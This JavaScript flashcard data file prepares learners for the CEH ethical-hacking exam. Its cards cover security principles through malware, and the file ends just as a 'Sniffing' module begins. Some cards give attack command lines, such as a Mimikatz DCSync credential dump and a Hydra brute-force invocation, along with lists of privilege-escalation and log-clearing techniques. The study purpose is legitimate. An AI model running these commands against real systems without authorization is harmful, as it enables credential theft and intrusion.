// CEHStudy Flashcard Data — All 20 Modules
// Expanded with content from multiple source repos

const CEH_DATA = {
    modules: [
        {
            id: 1,
            title: "Introduction to Ethical Hacking",
            sections: [
                {
                    title: "Information Security Principles",
                    cards: [
                        { q: "Five pillars of info security?", a: "Confidentiality—data only for authorized users\nIntegrity—no unauthorized changes\nAvailability—resources when needed\nAuthenticity—genuine files, comms, identities\nNon-repudiation—sender can't deny sending" },
                        { q: "CIA triad?", a: "Core principles\nConfidentiality: passwords, encryption, access controls\nIntegrity: hash functions, version control, checksums\nAvailability: anti-DoS protection, redundancy, backups" },
                        { q: "Risk analysis formulas?", a: "Risk = Threats × Vulnerabilities × Impact\nAlt: Risk = Threat × Vulnerability × Asset Value\nRisk Level = Consequence × Likelihood\nARO (Annual Rate of Occurrence)=threat events per year\nSLE (Single Loss Expectancy)=monetary loss per occurrence\nALE (Annualized Loss Expectancy)=SLE × ARO" },
                        { q: "BCP (Business Continuity Plan)?", a: "Documented process keeping essential functions running during/after disaster\nIR procedures, backups, recovery sites, comms plan" },
                        { q: "IR (Incident Response) + phases?", a: "Structured handling of security breaches\n1) Preparation—tools, training, policies\n2) Recording & Assignment—document + assign\n3) Triage—severity, impact\n4) Notification—alert stakeholders\n5) Containment—stop further damage\n6) Evidence Gathering—preserve forensic data\n7) Eradication—remove threat\n8) Recovery—normal operation\n9) Post-Incident—lessons learned, report" },
                        { q: "Information Assurance (IA)?", a: "Starts with policy, ends with people; between = risk management\nPlan→Design→Find Problems→Get Resources→Plan Fixes→Apply Controls→Verify→Train People" },
                        { q: "Continual/Adaptive Security Strategy?", a: "Security evolving with threats; RISK = Threats × Vulnerabilities × Impact\nContinuous monitoring, threat intel, adaptive controls" },
                        { q: "Indicators of Compromise (IOCs)?", a: "Clues attackers leave showing a breach\nEmail: senders, addresses, subject lines, attachments\nNetwork: URLs, domains, IPs\nHost-based: filenames, hashes, registry keys\nBehavioral: PowerShell execution, remote command execution" }
                    ]
                },
                {
                    title: "Cyber Kill Chain & MITRE ATT&CK",
                    cards: [
                        { q: "Cyber Kill Chain?", a: "Lockheed Martin attack phases\n1) Reconnaissance—gather data, find vulns\n2) Weaponization—payload + exploits/backdoors\n3) Delivery—payload to target (email, USB, web)\n4) Exploitation—run delivered code\n5) Installation—backdoor/malware\n6) C2—command-and-control channel\n7) Actions & Objectives—steal data, destroy systems" },
                        { q: "MITRE ATT&CK framework?", a: "Adversary tactics/techniques knowledge base from real-world obs; classify + prepare for attacks\nTactics=WHY (e.g., Initial Access, Persistence), Techniques=HOW, Subtechniques=lower-level behavior, Procedures=in-the-wild examples\n16 Tactics: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact" },
                        { q: "Diamond Model of Intrusion Analysis?", a: "4 components\nAdversary (WHO): APT groups, cybercriminals, insiders, hacktivists\nCapability (WHAT): malware, exploits, ransomware, tools\nInfrastructure (WHERE): C2 servers, malicious domains, IPs\nVictim (TARGETED): orgs, individuals, systems" },
                        { q: "Cyber Threat Intelligence (CTI)?", a: "Evidence-based threat knowledge for security decisions\nStrategic: execs—trends, landscapes\nTactical: security teams—TTPs, indicators\nOperational: IR—timing, targets\nTechnical: systems/SIEM/IDS—IOCs, signatures\nLifecycle: Direction→Collection→Processing→Analysis→Dissemination→Feedback" },
                        { q: "Threat modeling?", a: "Find what can go wrong, how systems get attacked, how to mitigate\n1) Identify assets, data\n2) Attack trees\n3) Identify threats (STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege)\n4) Mitigate\n5) Validate assumptions" }
                    ]
                },
                {
                    title: "Attack Types & Pen Test Phases",
                    cards: [
                        { q: "Threat actor types?", a: "White Hat: ethical, authorized\nBlack Hat: malicious, personal gain\nGray Hat: no auth, usually no malice\nScript Kiddies: unskilled, pre-made tools\nCyber Terrorists: religious/political motives\nState-Sponsored: nation states vs nations\nHacktivists: political agenda—deface/disable\nHacker Teams: skilled, share resources\nIndustrial Spies: corporate espionage\nInsiders: trusted users from within\nCriminal Syndicates: organized crime" },
                        { q: "Cyber attack types?", a: "Passive: monitoring (sniffing, eavesdropping), data not altered\nActive: change/alter/delete data—higher discovery risk\nClose-in: physically close (shoulder surfing)\nInsider: existing access\nDistribution: before delivery to customer" },
                        { q: "Pen test phases?", a: "1) Preparation—scope, allowed attacks, team, rules of engagement\n2) Assessment—reconnaissance, scanning, exploitation\n3) Conclusion (Post-Assessment)—report, findings, remediation" },
                        { q: "Pretexting?", a: "Fabricated scenario to engage victim + extract info; research target first; impersonates IT support, bank rep, law enforcement" },
                        { q: "Baiting?", a: "Enticing offer luring victim into a trap\nInfected USB in parking lot, free downloads, exclusive content for credentials" },
                        { q: "Physical social engineering techniques?", a: "Eavesdropping: unauthorized conversations\nShoulder Surfing: screen, keyboard, password entry\nDumpster Diving: trash for sensitive docs\nImpersonation: posing as legitimate/authorized" }
                    ]
                },
                {
                    title: "Ethical Hacking Overview",
                    cards: [
                        { q: "Ethical hacking?", a: "Authorized circumvention of systems to find breaches; same tools/techniques as malicious hackers—with permission, defensive purpose" },
                        { q: "Hacking types?", a: "1) White Hat—authorized security professionals\n2) Black Hat—malicious\n3) Gray Hat—between; no auth, typically no malice" },
                        { q: "Penetration test?", a: "Authorized simulated cyberattack on system/network/web app to find vulnerabilities\nPlanning, reconnaissance, attacking, reporting" },
                        { q: "Ethical hacking phases?", a: "1) Reconnaissance (Footprinting)\n2) Scanning\n3) Gaining Access\n4) Maintaining Access\n5) Covering Tracks\n6) Reporting" },
                        { q: "Vulnerability assessment vs penetration testing?", a: "VA: identifies + quantifies vulnerabilities—broader, less deep\nPT: actively exploits vulns for business impact—deeper, exploitation-focused" }
                    ]
                },
                {
                    title: "Ethical Hacking Frameworks",
                    cards: [
                        { q: "OSSTMM?", a: "Open Source Security Testing Methodology Manual; free open framework; standardized metrics for pen testing" },
                        { q: "PTES?", a: "Penetration Testing Execution Standard; pre-engagement, intelligence gathering, threat modeling, vulnerability analysis, exploitation, post-exploitation, reporting" },
                        { q: "NIST SP 800-115?", a: "NIST guide to IT security testing—planning, testing, documentation phases" }
                    ]
                }
            ]
        },
        {
            id: 2,
            title: "Footprinting & Reconnaissance",
            sections: [
                {
                    title: "TCP/IP Networking",
                    cards: [
                        { q: "TCP vs UDP?", a: "TCP (Transmission Control Protocol): connection-oriented, three-way handshake, guaranteed ordered delivery, error checking, flow control; HTTP, HTTPS, FTP, SSH, SMTP, DNS\nUDP (User Datagram Protocol): connectionless, no handshake or guarantees, faster, lower overhead; TFTP, DNS, DHCP" },
                        { q: "TCP three-way handshake?", a: "1) SYN—client sends sync w/ random sequence number\n2) SYN/ACK—server acks + own SYN\n3) ACK—client acks, connection up\nThen FIN flags close comms, RST forces termination" },
                        { q: "TCP flags?", a: "SYN (Synchronize): start negotiation\nACK (Acknowledgement): confirms receipt\nRST (Reset): force termination\nFIN (Finish): graceful close\nURG (Urgent): out-of-band data\nPSH (Push): immediate delivery\nNULL: no flags (NULL scans)\nXMAS: FIN+URG+PSH set" },
                        { q: "Packet crafting tools?", a: "Custom packets: NetScanTools Pro, Ostinato, packETH, LANforge FIRE, Colasoft Packet Builder\nUses: testing, scanning, custom protocol packets" }
                    ]
                },
                {
                    title: "Google Advanced Search Operators",
                    cards: [
                        { q: "Google Hacking / advanced search operators?", a: "cache: cached page from Google index\nlink: pages linking to URL\nrelated: similar pages\ninfo: Google's data about a page\nsite: restrict to domain\nallintitle: all keywords in title\nintitle: keyword in title\nallinurl: all keywords in URL\ninurl: keyword in URL\nlocation: info for a location" },
                        { q: "Meta + FTP search engines?", a: "Meta (hide user IP): Startpage, MetaGear, etools.ch\nFTP: NAPALM FTP Indexer, FreewareWeb, Mamont, GlobalFileSearch.com" },
                        { q: "SCADA/IoT discovery tools?", a: "Shodan: internet-connected devices\nCensys: discover devices/services\nZoomEye: IoT/SCADA cyberspace search" }
                    ]
                },
                {
                    title: "DNS Records & Tools",
                    cards: [
                        { q: "Common DNS record types?", a: "A: hostname→IPv4\nAAAA: hostname→IPv6\nMX: domain's mail server\nNS: authoritative name servers\nCNAME: alias→true hostname\nSOA: zone authority info\nSRV: service location (LDAP, SIP)\nPTR: reverse lookup IP→hostname\nRP: responsible person, domain admin/owner\nHINFO: hardware type + OS\nTXT: text data for DKIM, SPF" },
                        { q: "DNS footprinting tools?", a: "Fierce: subdomains, DNS misconfigs, IP ranges, naming patterns\nDNSRecon: hosts, subdomains\nMxToolBox: DNS + email records\ndig/nslookup: built-in queries" },
                        { q: "theHarvester?", a: "Email + subdomain recon\nUsage: theHarvester -d microsoft -l 200 -b linkedin; -d=domain, -l=result limit (200), -b=source (linkedin, google, bing)\nCollects emails, subdomains, hostnames from public sources" }
                    ]
                },
                {
                    title: "WHOIS & RIRs",
                    cards: [
                        { q: "WHOIS lookup types?", a: "Thick: complete info in searchable database\nThin: domain name only, points to full whois server\nDecentralized: complete info held by independent entities (RIRs for IPs)" },
                        { q: "RIRs (Regional Internet Registries)?", a: "ARIN: Americas\nAFRINIC: Africa\nAPNIC: Asia-Pacific\nRIPE NCC: Europe, Middle East, Central Asia\nLACNIC: Latin America + Caribbean" },
                        { q: "IP geolocation?", a: "Map IP→physical location; tools like IP2Location give country, region, city, latitude/longitude" }
                    ]
                },
                {
                    title: "Footprinting Automation Tools",
                    cards: [
                        { q: "Key automated footprinting tools?", a: "Maltego: visual link analysis between entities\nRecon-ng: modular web-based recon framework (open-source)\nFOCA: metadata/hidden info in docs\nSubfinder: fast subdomain discovery\nOsint Framework: OSINT tools by category\nReconDog: all-in-one (DNS, whois, port scan)\nBillCipher: multi-purpose recon" },
                        { q: "FOCA?", a: "FOCA (Find Out Come Access)—metadata/hidden info in scanned documents\nOffice doc metadata (author, company, timestamps), hidden comments, tracked changes, network paths/usernames from properties, PDF annotations + form data" },
                        { q: "Maltego?", a: "Link analysis for OSINT + forensics; visualizes relationships between people, domains, IPs, URLs, social media accounts, companies/orgs, DNS records, infrastructure" }
                    ]
                },
                {
                    title: "Port Numbers & States",
                    cards: [
                        { q: "Port number ranges?", a: "Well Known: 0-1023 (standard services)\nRegistered: 1024-49,151 (specific applications)\nDynamic/Private: 49,152-65,535 (ephemeral)" },
                        { q: "Key ports + protocols?", a: "20/21 = FTP (TCP)\n22 = SSH (TCP)\n23 = Telnet (TCP)\n25 = SMTP (TCP)\n53 = DNS (TCP/UDP)\n67/68 = DHCP (UDP)\n69 = TFTP (UDP)\n80 = HTTP (TCP)\n443 = HTTPS (TCP)\n445 = SMB (TCP)\n3389 = RDP (TCP)" },
                        { q: "Common port states?", a: "OPEN: service accepting connections\nCLOSED: no listener, port reachable\nFILTERED: firewall blocks, no response\nOPEN or FILTERED: can't tell which\nCLOSED or FILTERED: can't tell which\nnetstat -an: all connections + listening ports\nnetstat -b: executable per open port" },
                        { q: "TCP connection states (netstat)?", a: "ESTABLISHED: active connection in use\nSYN_SENT: request sent\nSYN_RECEIVED: sent, waiting for response\nFIN_WAIT_1/2: waiting to close\nCLOSE_WAIT: remote side closed\nTIME_WAIT: local closed, waiting final ACK\nLISTEN: awaiting incoming" }
                    ]
                },
                {
                    title: "Footprinting Basics",
                    cards: [
                        { q: "Footprinting?", a: "Gather info on target infrastructure + applications pre-attack; first ethical-hacking phase; identifies attack vectors" },
                        { q: "Passive footprinting?", a: "Gather info without touching the target\nSearch engines, social media, WHOIS, public records, company websites" },
                        { q: "Active footprinting?", a: "Direct interaction with target\nNetwork scanning, ping sweeps, DNS zone transfers, enumeration\nMore detectable by security systems" }
                    ]
                },
                {
                    title: "Tools & Techniques",
                    cards: [
                        { q: "WHOIS lookup?", a: "Query domain/IP registration databases; contact details, registration dates, nameservers" },
                        { q: "DNS zone transfer?", a: "Replicates DNS records across servers\nAttacker (dig axfr or nslookup) can dump a domain's full host list" },
                        { q: "Google hacking?", a: "Advanced Google operators (dorks) to find exposed sensitive info\nsite:, filetype:, intitle:, inurl:—find databases, config files, admin panels" }
                    ]
                }
            ]
        },
        {
            id: 3,
            title: "Scanning Networks",
            sections: [
                {
                    title: "Nmap Scan Types & ICMP",
                    cards: [
                        { q: "Nmap scan types?", a: "SYN (-sS): stealth half-open, sends SYNs; default\nConnect (-sT): full TCP connect, 3-way handshake\nUDP (-sU): UDP ports (DNS, DHCP, SNMP)\nXMAS (-sX): FIN+PSH+URG flags, RST if closed\nNULL (-sN): no flags, same response as XMAS\nFIN (-sF): FIN only\nACK (-sA): stateful vs stateless firewall detection\nIdle (-sI): via zombie, very stealthy" },
                        { q: "Nmap Idle/Zombie scan?", a: "-sI via idle 'zombie' host—traffic appears from the zombie\nNeeds: 1) idle zombie w/ predictable IP ID sequence 2) zombie not communicating during scan 3) target replies to zombie, not scanner\nVery stealthy—target never sees scanner IP" },
                        { q: "Nmap OS detection?", a: "-O flag; TCP/IP stack fingerprints from crafted packets\nAnalyzes TCP Initial TTL, window size, IP ID sequence, TCP options order\nCompares vs nmap-os-db" },
                        { q: "ICMP + message types?", a: "Network-layer diagnostics\nType 0: Echo Reply (ping response)\nType 3: Destination Unreachable—Code 0 network unreachable, 1 host unreachable, 6 network unknown, 9 network admin prohibited, 13 comm admin prohibited\nType 4: Source Quench (rate limit)\nType 5: Redirect (route optimization)\nType 8: Echo Request (ping)\nType 11: Time Exceeded (traceroute)" },
                        { q: "Ping sweep?", a: "Find active hosts via ICMP Echo Requests; noisy but effective\nAngry IP Scanner, SolarWinds Engineer's Toolset, Superscan, Advanced IP Scanner, PingPlotter\nNmap: nmap -sn" }
                    ]
                },
                {
                    title: "Network Scanning",
                    cards: [
                        { q: "Port scanning?", a: "Probe target ports to discover running services\nSYN (stealth), Connect (full), XMAS, NULL, FIN, Idle" },
                        { q: "OS fingerprinting?", a: "Determine target OS from TCP/IP stack responses; active (crafted packets) or passive (observed traffic)" },
                        { q: "Network scanning tools?", a: "Nmap (port scanning, OS detection, script engine), Nessus, OpenVAS, Masscan, ZMap, Angry IP Scanner, Netcat" }
                    ]
                },
                {
                    title: "Vulnerability Scanning",
                    cards: [
                        { q: "Vulnerability scanner?", a: "Automated discovery of known vulns by matching config + software versions against CVE databases" },
                        { q: "Authenticated vs unauthenticated scanning?", a: "Authenticated: valid credentials, deeper assessment\nUnauthenticated: external observation only—misses config issues" }
                    ]
                }
            ]
        },
        {
            id: 4,
            title: "Enumeration",
            sections: [
                {
                    title: "Enumeration Protocols & Services",
                    cards: [
                        { q: "SMTP enumeration?", a: "Verify addresses + enumerate users via VRFY, EXPN, RCPT TO; many servers disable these\nsmtp-user-enum, Nmap scripts (smtp-enum), Swaks" },
                        { q: "LDAP enumeration?", a: "User lists, group memberships, org structure\nPorts 389 (unencrypted), 636 (LDAPS)\nldapsearch, Quest ActiveRoles Server" },
                        { q: "NetBIOS enumeration?", a: "Session Service (139) + Name Service (137/138)\nComputer names, users, domains, workgroups\nnbtscan, enum4linux, rpcclient" },
                        { q: "SNMP enumeration?", a: "Community strings extract system info, interface stats, routing tables, connected devices\nDefaults: 'public' (read-only), 'private' (read-write)\nsnmpwalk, snmpget, Net-SNMP" },
                        { q: "Enumeration?", a: "Extract usernames, hostnames, IPs, services + details from target systems; beyond scanning—actionable intelligence" },
                        { q: "Commonly enumerated protocols?", a: "1) SNMP (Simple Network Management Protocol)\n2) LDAP (Lightweight Directory Access Protocol)\n3) NMB/NetBIOS\n4) SMTP\n5) FTP\n6) DNS\n7) SMB/CIFS" }
                    ]
                }
            ]
        },
        {
            id: 5,
            title: "Vulnerability Analysis",
            sections: [
                {
                    title: "Vulnerability Assessment Tools & Concepts",
                    cards: [
                        { q: "Popular vulnerability scanners?", a: "Nessus: industry standard, extensive plugins\nOpenVAS: open-source alternative\nQualys: cloud vulnerability management\nNexpose/Rapid7: enterprise scanning\nBurp Suite: web app focused\nAcunetix: automated web scanner" },
                        { q: "CVE (Common Vulnerabilities and Exposures)?", a: "Dictionary of publicly disclosed vulnerabilities; each entry = unique ID (CVE-2024-1234) + description; maintained by MITRE" },
                        { q: "CVSS scoring?", a: "Rates vulns 0.0-10.0: 0.0 None\n0.1-3.9 Low\n4.0-6.9 Medium\n7.0-8.9 High\n9.0-10.0 Critical\nBase metrics: Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, Confidentiality, Integrity, Availability" },
                        { q: "Vulnerability?", a: "Exploitable weakness in system, procedures, controls, or implementation\nUnpatched software, misconfigurations, weak passwords" },
                        { q: "False positives in vulnerability scanning?", a: "Reported vuln that doesn't exist—scanner misconfig, version detection errors, context exceptions; verify manually" }
                    ]
                }
            ]
        },
        {
            id: 6,
            title: "System Hacking",
            sections: [
                {
                    title: "Windows Password Storage & Authentication",
                    cards: [
                        { q: "Windows SAM password storage?", a: "Hashed (one-way) Windows passwords\n%SystemRoot%\\system32\\config\\SAM → registry HKEY_LOCAL_MACHINE\\SAM\nCan't copy while Windows runs\nSYSKEY partially encrypts hashes\nLM or NTLM hashes\npwdump7, Mimikatz, DSinternals, hashcat, PyCrack" },
                        { q: "NTLM authentication?", a: "Default Windows auth scheme; no official protocol spec\nVista+ disabled LM hashing (blank in later Windows)\nClient requests access→server challenge→client response→server verifies (AD or SAM)\nNTLMv2 reasonably secure, weaker than Kerberos" },
                        { q: "Kerberos authentication?", a: "Secret-key auth; upgrade from NTLM\nKDC (Key Distribution Center), AS (Authentication Server), TGS (Ticket Granting Server)\nLogin→request ticket→receive TGT→request service access→receive Service Ticket→access service" },
                        { q: "Password dump/interception methods?", a: "Memory credential dumps\nSAM database local copy\nAD ntds.dit file\nSYSKEY boot key\nNetwork interception (passive sniffing, MITM)\nCaptures plaintext, LM, NTLM, NTLMv2, Kerberos tokens" }
                    ]
                },
                {
                    title: "Password Cracking Methods",
                    cards: [
                        { q: "Types of password attacks?", a: "Non-electronic: social engineering, dumpster diving\nActive online: dictionary, brute force, rule-based, hybrid (dictionary + modifications), password spraying, hash injection, Pass the Hash (PtH), LLMNR/NBT-NS poisoning (Responder), Markov-chain\nPassive online: wire sniffing at data link layer\nOffline: recover from hash dump" },
                        { q: "Pass the Hash (PtH) attack?", a: "Inject compromised hash into local session to validate network resources; logged-in user hash logs into domain controller; no password cracking needed" },
                        { q: "LLMNR/NBT-NS poisoning?", a: "Windows same-link name resolution (LLMNR + NBT-NS)\nAttacker spoofs responses to intercept auth\nResponder—detects + performs poisoning\nVindicate, got-responded detect it" },
                        { q: "AS-REP Roasting?", a: "Crack Kerberos TGT for users without pre-authentication\nNeeds DC connectivity + domain account\nExtract AS-REP ticket→crack offline for password" },
                        { q: "Password cracking tools?", a: "THC Hydra: hydra -l username -P wordlist.txt target\nMetasploit auxiliary modules, Rubeus (Kerberos), adfsbrute, CrackMapExec\nHashcat (hash mode: hashcat -m 0 for MD5)\nL0phtCrack—lost MS passwords\nRainbowCrack—rainbow tables\nPassware Kit, Elcomsoft Distributed Password Recovery" },
                        { q: "Password Spraying?", a: "Same common password against many accounts at once; avoids lockouts single-account brute force triggers\ne.g., 'Password123' on all users" }
                    ]
                },
                {
                    title: "Metasploit Framework",
                    cards: [
                        { q: "Metasploit module types?", a: "Exploit: configure active exploit, target + payload, launch\nPayload: attacker-victim channel—Singles (standalone), Stagers (set up connection), Stages (downloaded by stager)\nAuxiliary: one-time actions (port scan, DoS, fuzzing); use, exploit/run\nNOPs: buffer bloat instructions; msfgenerate\nEncoder: hide/encode payload via polymorphism\nEvasion: modify payload behavior (evasion/windows/windows_defender.exe)\nPost-exploitation: interact after compromise (post/windows/gather/enum_logged_on_users)" },
                        { q: "AI-powered vulnerability exploitation tools?", a: "Nebula: AI vulnerability exploitation\nDeepExploit: Metasploit-linked, AI automated pen testing" }
                    ]
                },
                {
                    title: "Buffer Overflow",
                    cards: [
                        { q: "Buffer overflow?", a: "Adjacent memory area for runtime data; overflow writes past it→overwrites neighbors\nInjects malicious code, damages files, escalates privileges, gains shell\nVulns: no boundary checks, older languages, unsafe functions (gets, strcpy), no input validation, improper memory allocation" },
                        { q: "Types of buffer overflow?", a: "Stack-based: static LIFO, PUSH/POP; attacker controls EIP to replace return address; EBP=Extended Base Pointer, ESP=Extended Stack Pointer, EIP=Extended Instruction Pointer (target), ESI/EDI=Source/Destination Index\nHeap-based: dynamic runtime allocation; overwrites object pointers" },
                        { q: "Return Oriented Programming (ROP)?", a: "Reuse code snippets already in the binary (libc, kernel32.dll); chain 'gadgets' ending in RET for arbitrary execution" },
                        { q: "Heap Spraying?", a: "Flood process free memory with copies of malicious code; raises code-execution odds with overflow exploits" },
                        { q: "Buffer overflow exploitation tools?", a: "Spiking: crafted TCP/UDP packets to crash; nc -nv ip port, STATS template\nFuzzing: Python while-loop scripts; pattern_create + pattern_offset find EIP overwrite offset (Metasploit)\nMetasploit exploit modules\nOllyDbg: Windows debugger" }
                    ]
                },
                {
                    title: "Privilege Escalation",
                    cards: [
                        { q: "Privilege Escalation types?", a: "Horizontal: access resources of a user with similar permissions\nVertical: gain higher privilege (user→admin/root)" },
                        { q: "DLL/Dylib Hijacking attacks?", a: "DLL Hijacking (Windows): malicious DLL in app library path; Spartacus\nDylib Hijacking (macOS): dynamic library attacks; Dylib Hijack Scanner\nDetection: Dependency Walker, Dylib Hijack Scanner" },
                        { q: "Meltdown and Spectre?", a: "Spectre: AMD, Apple, ARM, Intel; speculative execution reads restricted data\nMeltdown: all ARM + Intel CPUs; out-of-bounds memory access" },
                        { q: "DCSync attack?", a: "Privileged account w/ domain replication rights→create virtual DC like original AD\nExtracts NTLM hashes, enables Golden Ticket\nMimikatz—lsadump::dcsync /domain:(domain) /user:Administrator" },
                        { q: "Golden Ticket attack?", a: "Forge TGT post-exploitation\nNeeds KRBTGT password hash\nAccess to ANY domain service, indefinitely\nMimikatz" },
                        { q: "Silver Ticket attack?", a: "Steal user creds, forge Service Ticket (TGS not TGT)\nSpecific service access only, not whole domain\nMimikatz" },
                        { q: "Other privilege escalation techniques?", a: "Named Pipe Impersonation (Metasploit)\nUnquoted Service Paths\nService Object Permissions\nNFS misconfig (2049): showmount, mount\nUAC Bypass: FodHelper, eventvwr Registry, COM handler hijack\nBoot/Login abuse: Logon + RC scripts, StartupItems\nGroup Policy: New-GPOImmediateTask\nADCS abuse—Certipy\nAccess Token Manipulation\nParent PID Spoofing\nApp Shimming (UAC bypass)\nSID-History Injection\nCOM Hijacking\nScheduled Tasks\nSetuid/Setgid (Linux/macOS)\nWeb Shell" },
                        { q: "Privilege Escalation tools?", a: "BeRoot: post-exploitation privesc\nPowerSploit, PowerView: PowerShell post-exploitation\nPEASS-ng\nWinPEAS: Windows enumeration\nFullPowers: macOS privesc\npwncat: reverse shell + priv tools\nTraitor: Linux privesc" }
                    ]
                },
                {
                    title: "Maintaining Access",
                    cards: [
                        { q: "Methods for maintaining access?", a: "Backdoors: unauthorized access\nKeyloggers: hardware or software (Metasploit remote keylogger, REFOG, NetBull)\nSpyware: screenshots + monitoring (Spytech SpyAgent, iKeyMonitor)\nRootkits: hide presence—hypervisor, firmware, kernel, boot-loader, application, library, memory level\nNTFS Alternate Data Streams: hidden file streams; StreamArmor, GMER, ADS Scanner\nSteganography: data in images/audio/video; OpenStego, StegoOnline, DeepSound" },
                        { q: "Remote Code Execution techniques?", a: "Web-browser exploitation (spear phishing)\nOffice-app exploitation\nWMI (Windows Management Instrumentation)\nWinRM (Windows Remote Management)\nDameware, Ninja, Pupy, PsExec, PDQ Deploy, ManageEngine Endpoint Central" },
                        { q: "Active Directory persistence attacks?", a: "Skeleton Key: false credentials, memory-resident virus (Mimikatz)\nOverpass the Hash: pass-the-ticket/hash extension (Mimikatz)\nMalicious Replication: copy user data w/ admin creds\nWMI Event Subscription (PowerLurk)\nAdminSDHolder abuse: SDProp protects high-privilege accounts" },
                        { q: "Hiding evidence of compromise?", a: "Disable auditing + Windows functionality\nClear, manipulate logs (Metasploit meterpreter)\nCover tracks on network/OS\nDelete files, hide artifacts\ncipher.exe secure file deletion" }
                    ]
                },
                {
                    title: "Hacking Methods",
                    cards: [
                        { q: "Hacker methodology?", a: "1) Gaining Access\n2) Escalating Privileges\n3) Executing Applications\n4) Hiding Files/Processes\n5) Harvesting Credentials\n6) Exploiting Weaknesses\n7) Lateral Movement" },
                        { q: "Privilege escalation (definition)?", a: "Exploit a bug, design flaw, or misconfiguration for elevated access to protected resources\nVertical (to admin/root), horizontal (same-level user)" },
                        { q: "System hacking tools?", a: "Mimikatz (credential dumping), Metasploit (exploitation framework), John the Ripper/Hashcat (password cracking), Netcat (network tool), PowerShell Empire (post-exploitation), Cobalt Strike" }
                    ]
                }
            ]
        },
        {
            id: 7,
            title: "Malware Threats",
            sections: [
                {
                    title: "Advanced Malware Types",
                    cards: [
                        { q: "How does fileless malware work?", a: "Lives entirely in memory, never touches disk\nLegitimate tools for execution (PowerShell, WMI)\nHard for traditional AV\ne.g., PowerShell -encodedcommand, WMI event subscriptions" },
                        { q: "How does polymorphic malware evade AV?", a: "Changes code signature each replication; algorithm intact\nMutation engines evade signature-based AV\nMetamorphic instead rewrites ENTIRE code structure" },
                        { q: "How does metamorphic malware work?", a: "Rewrites entire code structure each infection\nSame function, different code\nMore advanced than polymorphic—signature AND behavior change" },
                        { q: "Logic bomb?", a: "Triggered by date/event/password; dormant until trigger\nOften planted by disgruntled insiders" },
                        { q: "Worm vs virus—spread mechanisms?", a: "Virus: needs host file + human action (open attachment, run program)\nWorm: standalone, self-replicates across networks w/o user interaction\nWorms faster; viruses more destructive" },
                        { q: "Trojan types?", a: "Downloader: pulls additional malware\nDropper: deploys other malware\nBackdoor: unauthorized access channel\nDDoS: joins botnet\nBanking: steals financial credentials\nRAT (Remote Access): full remote control" }
                    ]
                },
                {
                    title: "APT & Botnets",
                    cards: [
                        { q: "APT (Advanced Persistent Threat)?", a: "Sophisticated, long-term targeted attack; stays undetected\nState-sponsored or highly organized\nCustom malware + zero-days\nAPT28 (Fancy Bear), APT29 (Cozy Bear), Lazarus Group" },
                        { q: "Botnet C&C models + examples?", a: "Compromised computers (bots/zombies) controlled by C&C servers\nDDoS, spam, cryptomining, credential stuffing\nModels: Hub-and-spoke, P2P, DNS-based\nMirai (IoT), Emotet, TrickBot, QakBot" },
                        { q: "Cryptomining malware: variants + signs?", a: "Hijacks victim resources to mine crypto (Proof-of-Work puzzles)\n'Cryptojacking'\nInline (web-based) or installed (malware)\nSigns: high CPU/GPU, higher power use" },
                        { q: "Ransomware + types?", a: "Encrypts files, demands payment\nCrypto-ransomware: encrypts files\nLocker-ransomware: locks device/screen\nDouble Extortion: steals data THEN encrypts (leak threat)\nWannaCry, Ryuk, LockBit, BlackCat/ALPHV" },
                        { q: "Stuxnet worm?", a: "Discovered 2010; targeted Iranian nuclear facilities\nSiemens SCADA attack disrupted centrifuges\nMultiple zero-days\nFirst cyberweapon on physical infrastructure\nAPT capability with nation-state resources" }
                    ]
                },
                {
                    title: "Malware Analysis",
                    cards: [
                        { q: "Malware analysis methods?", a: "Static—no execution: disassembly, strings, header analysis, file hash (MD5, SHA256), PE analysis\nDynamic—controlled run: sandbox (Cuckoo, Joe Sandbox), network traffic, file modifications, registry changes, process behavior" },
                        { q: "Malware analysis tools?", a: "Static: IDA Pro, Ghidra, PEiD, strings, exiftool\nDynamic: Cuckoo, ANY.RUN, Joe Sandbox\nDebuggers: OllyDbg, x64dbg, GDB\nNetwork: Wireshark, TCPView\nMonitoring: Process Monitor, Process Explorer, API Monitor\nMemory: Volatility" },
                        { q: "Social engineering vectors for malware delivery?", a: "Trick users into running malware\nPhishing emails w/ malicious attachments\nDrive-by downloads from compromised sites\nMalicious USB (Baiting)\nCompromised software updates\nFake security alerts" },
                        { q: "Rootkit: levels + detection?", a: "Hides attacker presence\nLevels: user-mode, kernel-mode, hypervisor, firmware/BIOS, boot-loader\nDetection: integrity-based (Tripwire, AIDE), memory dumps, process-list comparison\nGMER (SirMed), Stinger, TDSSKiller, Avast One" }
                    ]
                },
                {
                    title: "Malware Overview",
                    cards: [
                        { q: "Malware?", a: "Intentionally harmful program/file\nViruses, worms, trojans, ransomware, spyware, adware, rootkits, logic bombs" },
                        { q: "Virus vs worm—key difference?", a: "Virus needs host file + human action\nWorm: standalone, self-replicates across networks without user action" },
                        { q: "Trojan horse?", a: "Malicious code disguised as legitimate software; does NOT self-replicate\nDownloaders, droppers, backdoor, DDoS trojans" },
                        { q: "Ransomware?", a: "Encrypts files, demands payment\nCrypto (encrypts files), locker (locks screen)\nDouble extortion—steal + encrypt" },
                        { q: "Rootkit?", a: "Hides attacker presence\nUser-mode, kernel-mode, hypervisor-level, firmware/BIOS" },
                        { q: "Polymorphic malware?", a: "Changes signature each replication; algorithm intact\nMutation engines evade signature-based AV" },
                        { q: "Metamorphic malware?", a: "Rewrites entire code structure each infection—same function, different code\nMore advanced: changes signature AND behavior" },
                        { q: "Fileless malware?", a: "Entirely in memory, no disk writes\nLegitimate tools (PowerShell, WMI)—hard for traditional AV" },
                        { q: "What defines an APT?", a: "Sophisticated, long-term targeted attack; stays undetected\nState-sponsored/highly organized; custom malware + zero-days" },
                        { q: "Cryptomining malware?", a: "Hijacks victim resources to mine crypto without consent\nProof-of-Work puzzles\n'Cryptojacking'" },
                        { q: "How to analyze malware?", a: "Static—examine code without running (disassembly, strings, headers)\nDynamic—sandbox/VM run; observe network connections, file modifications, registry changes" },
                        { q: "Social engineering + malware distribution?", a: "Trick users into executing malware\nPhishing emails, malicious attachments, drive-by downloads, compromised websites" },
                        { q: "Botnet?", a: "Compromised computers (bots/zombies) via C&C servers\nDDoS, spam, cryptomining" }
                    ]
                }
            ]
        },
        {
            id: 8,
            title: "Sniffing",
            sections: [
                {
